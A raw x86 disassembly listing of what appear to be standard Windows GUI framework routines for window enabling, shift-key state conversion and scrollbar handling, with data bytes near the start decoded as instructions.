and al [ ecx ]
add al [ eax ]
add eax 0x6d726f46
jae r-xdata
add [ ecx + rw-data ] ah
retn
sub_44d9b9
push cs
add [ 0x6d726f46 ] al
jae r-xdata
cmp al 0x10
inc eax
add ah ch
adc al [ ebp ]
add [ ebx ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx ] bh
xor [ eax ] eax
and al 0x32
inc eax
add [ eax ] cl
push esp
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x9000408d
fiadd [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
fiadd [ eax + eax - 0x20 ]
fiadd [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
fiadd [ eax + eax - 0x60 ]
add [ eax ] al
add [ ecx ] cl
inc ecx
add [ ecx + ebx * 4 + 0x41 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xfffffffff4451abe
inc edi
inc ebp
add al cl
inc ecx
add [ eax - 0x6b ] bl
inc ecx
add ah ah
cmp eax 0x96300041
inc ecx
add ah bh
xchg esp eax
inc ecx
add [ eax - 0x6a ] al
inc ecx
add [ eax ] bh
xchg edi eax
inc ecx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 + 0x469c0041 ] al
outsb
arpl [ eax - 0x70 ] bp
cmp dl bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
fiadd [ eax + eax + 0xc ]
add [ eax ] al
add [ eax + 0x64004010 ] ah
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24451a66
xor al [ eax ]
or [ ebp + ecx * 2 + 0x6f ] dl
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
loopne r-xdata
test [ ecx + 0x469c0041 ] bl
inc esp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
nop
fiadd [ eax + eax + 0x8 ]
and al [ ecx ]
add al [ eax ]
add eax 0x6d726f46
jae r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
xchg edx eax
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x6c451b96
pop ecx
inc ebp
add al cl
inc ecx
add [ eax - 0x6b ] bl
inc ecx
add ah ah
cmp eax 0x96300041
inc ecx
add ah bh
xchg esp eax
inc ecx
add [ eax - 0x6a ] al
inc ecx
add [ eax ] bh
xchg edi eax
inc ecx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 + 0x57800041 ] al
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
xchg esp eax
daa
inc edx
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] dl
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
nop
push 0x44db
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1bffbb25 ] bl
fild [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
fild [ eax + eax + 0x40 ]
add [ eax ] eax
add [ ecx ] cl
inc ecx
add [ ecx + ebx * 4 + 0x41 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
in al 0xdb
inc esp
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
push 0x80044db
and al [ ecx ]
add al [ eax ]
add eax 0x6d726f46
jae r-xdata
add [ ecx + rw-data ] ah
retn
sub_44dc14
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_44dc60
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_457368
mov eax [ rw-data ]
call sub_419480
mov eax [ rw-data ]
call sub_419428
retn
push 0x0
push eax
call ShowOwnedPopups
sub_44dc98
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_44dce8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_4036bc#7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_44dc98
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd92
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_44dd9c
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026dc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_44ddd4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_44de38
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_44ddd4
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_44de94
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_44deb4
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_44de94
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_44dee0
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_454948
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_454db8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407af4
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454934
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454da4
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407af4
test eax eax
je r-xdata
sub_44df68
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44dfbc
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44dff8
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_44e044
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44bbf8
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404154
mov eax [ ebp - 0x8 ]
pop edx
call sub_407af4
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e0a9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
sub_44e0b4
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_44e0dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44e0b4
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e154
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
sub_44e15c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_44e1ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413de4
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_44eab4
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_44ea94
mov edx [ edi + 0xc ]
mov eax ebx
call sub_44e944
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e23c
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44e3f4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4379cc
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_44e944
xor edx edx
mov eax ebx
call sub_44e944
jmp r-xdata
sub_44e274
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421bb0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44e2e0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421bb0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44e348
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_44ea7c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43a870
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_44ea7c
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43a834
call sub_44e2e0
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43a834
call sub_44e274
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_44e3f4
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_43db40
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44e42c
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43db40
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_44e460
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44e42c
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44e42c
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_44e4dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43db40
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_44e460
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_436d5c
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_44e460
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_436da0
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44e574
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43db40
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_44e5d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_44e7a5 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44e4dc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44e4dc
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44e944
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
push ebp
call sub_44e574
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
push ebp
call sub_44e574
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_4067f8
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44e944
jmp r-xdata
sub_44e8cc
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44efbc
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_44e944
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_43db40
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_43db40
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_43d6f8
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_43d6f8
jmp r-xdata
call sub_44e0b4
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44ea08
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44efbc
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
